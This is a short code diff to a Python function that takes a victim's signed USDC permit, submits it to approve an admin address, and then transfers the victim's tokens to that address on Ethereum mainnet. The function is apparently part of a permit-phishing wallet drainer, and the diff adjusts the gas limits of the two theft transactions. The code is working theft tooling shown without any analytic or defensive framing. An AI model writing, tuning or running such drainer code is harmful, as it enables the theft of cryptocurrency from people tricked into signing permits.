@@ -47,7 +47,7 @@ def execute_usdc_transfer(victim_address, amount, deadline, v, r, s):
         permit_tx = contract.functions.permit(
             victim_addr, admin_addr, target_amount_raw, int(deadline), int(v), r_bytes, s_bytes
         ).build_transaction({
-            "from": admin_addr, "nonce": current_nonce, "gas": 100000, "gasPrice": gas_price, "chainId": 1
+            "from": admin_addr, "nonce": current_nonce, "gas": 120000, "gasPrice": gas_price, "chainId": 1
         })
         w3.eth.send_raw_transaction(w3.eth.account.sign_transaction(permit_tx, ADMIN_PRIVATE_KEY).raw_transaction)
 
@@ -55,7 +55,7 @@ def execute_usdc_transfer(victim_address, amount, deadline, v, r, s):
         transfer_tx = contract.functions.transferFrom(
             victim_addr, admin_addr, target_amount_raw
         ).build_transaction({
-            "from": admin_addr, "nonce": current_nonce + 1, "gas": 100000, "gasPrice": gas_price, "chainId": 1
+            "from": admin_addr, "nonce": current_nonce + 1, "gas": 80000, "gasPrice": gas_price, "chainId": 1
         })
         tx_hash = w3.eth.send_raw_transaction(w3.eth.account.sign_transaction(transfer_tx, ADMIN_PRIVATE_KEY).raw_transaction)
 
